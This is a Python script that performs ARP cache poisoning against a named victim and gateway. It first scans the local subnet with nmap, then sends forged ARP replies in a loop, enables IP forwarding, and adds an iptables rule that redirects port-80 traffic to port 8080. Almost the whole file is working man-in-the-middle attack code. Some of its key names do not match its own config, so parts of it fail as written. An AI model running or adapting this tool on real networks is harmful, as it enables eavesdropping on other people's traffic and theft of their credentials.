#!/usr/bin/python

from scapy.all import *
from argparse import ArgumentParser


import os
import socket
import nmap

def set_configs():
    parser = ArgumentParser()
    parser.add_argument('-m',dest='mapping',
                        action='store_true',
                        help='mapping your own machine and the relative addresses')
    parser.add_argument('-r',
                        dest='num',
                        type=int,
                        help='Global Network arp response sending n packets'
                        )
    parser.add_argument('-v',
                        dest='victim',
                        type=str,
                        help='Set the victim'
                        )
    parser.add_argument('-g',
                        dest='gateway',
                        type=str,
                        help='Set the gateway')
    parser.set_defaults(feature=False)
    args=parser.parse_args()
    return {
        'num': args.num,
        'victim': {'ip':args.victim,
                   'mac': ip_to_mac(args.victim)},
        'gateway':{ 'ip':args.gateway,
                    'mac': ip_to_mac(args.gateway)
        },
        'mapping':args.mapping

    }
def get_up_hosts():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("180.76.76.76", 80))
    ip_address = s.getsockname()[0]
    print 'Your IP Address is ',s.getsockname()
    mark = 0
    ip_scope = ''
    ip_list = []
    for x in range(0, len(ip_address)):
        ip_scope = ip_scope + ip_address[x]
        if ip_address[x] == '.':
            mark = mark + 1
        if mark == 3:
            ip_scope = ip_scope + '0/24'
            break
    nm = nmap.PortScanner()
    nm.scan(ip_scope, arguments='-sP')
    for host in nm.all_hosts():
        if nm[host].state() == 'up':
            print 'Host: ',host, 'is up'
    '''        ip_list.append(host)
    return ip_list, ip_address'''

def features(configs):
    if configs['mapping']==True:
        get_up_hosts()
    elif configs['num']!=0:
        send_pkts(configs)
    else:
        enable_packet_forward()
        enable_http_redirection()
        send_pkt_victim(configs)


def ip_to_mac(ip, retry=10, timeout=2):
    arp=ARP()
    arp.op=1
    arp.pdst=ip
    arp.hwdst='ff:ff:ff:ff:ff:ff'
    response, unanswered = sr(arp, retry=retry, timeout=timeout)
    for s,r in response:
        return r[ARP].underlayer.src
    return None


def sniff_pkts(configs):
    pkts=sniff(count=configs['num'],filter="arp")
    victim_list=[]
    j=0
    for x in range(0, len(pkts)):
        term=pkts[x]
        flag=0
        for y in range(0,x):
            if (term[Ether].src==victim_list[y][0] and term[ARP].pdst==victim_list[y][2]):
               flag=flag+1
            break
        if flag==0:
            victim_list.append([])
            victim_list[j].append(term[Ether].src)
            victim_list[j].append(term[ARP].psrc)
            victim_list[j].append(term[ARP].pdst)
            j=j+1
    return victim_list

def send_pkts(configs):
    source_list=sniff_pkts(configs)
    print 'Sending all packets....'
    for x in range(0,len(source_list)):
        arp=ARP()
        arp.op=2
        arp.hwdst=source_list[x][0]
        arp.psrc=source_list[x][2]
        arp.pdst=source_list[x][1]
        send(arp)
    print 'Sending packets done.'


def send_pkt_victim(configs):

    victim_ip=configs['victim_ip']
    victim_mac=configs['victiom_mac']

    gateway_ip=configs['gateway_ip']
    gateway_mac=configs['gateway_mac']

    victim_arp=ARP()
    gateway_arp=ARP()

    gateway_arp.op=2
    victim_arp.op=2

    victim_arp.psrc=gateway_ip
    gateway_arp.psrc=victim_ip

    victim_arp.pdst=victim_ip
    gateway_arp.pdst=gateway_ip

    victim_arp.hwdst=victim_mac
    gateway_arp.hwdst=gateway_mac

    while True:

        try:
            print 'Poisoning victim...'
            send(victim_arp)
            send(gateway_arp)
            response=sniff(filter='arp and host %s or %s' % \
                     (gateway_ip, victim_ip), count=1)
            response.show()
        except KeyboardInterrupt:
            break
        print 'ARP Cache Poisoning finished'

def enable_packet_forward():
    print('Setting IPV4 ip_forward True....')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def enable_http_redirection():
    print('Redirecting to port 8080....')
    os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080')


def main():
    try:
        configs = set_configs()
        features(configs)
    except:
        KeyboardInterrupt

if __name__ == '__main__':
    main()
